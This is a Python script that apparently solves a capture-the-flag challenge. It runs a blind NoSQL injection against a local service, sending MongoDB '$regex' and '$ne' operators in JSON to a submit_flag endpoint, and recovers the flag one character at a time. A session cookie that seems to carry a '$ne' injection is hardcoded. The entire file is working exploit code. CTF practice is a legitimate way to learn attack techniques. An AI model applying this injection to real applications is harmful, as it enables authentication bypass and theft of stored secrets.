#!/usr/bin/python3
import string

import requests

url = "http://localhost:1337/"

characters = (
    string.ascii_lowercase + string.ascii_uppercase + string.digits + '_@{}-/()!"$%=:;'
)

# data = {"_id": "_id:3", "challenge_flag": {"$ne": None}}
data = {"_id": "_id:3", "challenge_flag": {"$regex": "^1"}}

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Content-Type": "application/json",
    "Connection": "keep-alive",
    "Cookie": "session=eyJ1c2VyIjp7Il9pZCI6IjRmMGEyOGI0Y2ZjYjRhZTg5NzliNDc3ZGQzZWM2ODZiIiwidXNlcm5hbWUiOiJ7XCIkbmVcIjogbnVsbH0ifX0.ZVgILg.SSLmsfl8nj1hnOda-1YX4gjDIP8",
}


flag = ""
# r = requests.post(url + "submit_flag", json=data, headers=headers)

while True:
    for char in characters:
        print(f"[*]Flag: {flag}")
        data = {"_id": "_id:3", "challenge_flag": {"$regex": f"^{flag+char}"}}
        r = requests.post(url + "submit_flag", json=data, headers=headers)
        if "correct flag!" in r.text:
            flag += char
        if flag.endswith("}"):
            break
    else:
        continue
    break
# print(r.text)
print(f"[*]Flag: {flag}")
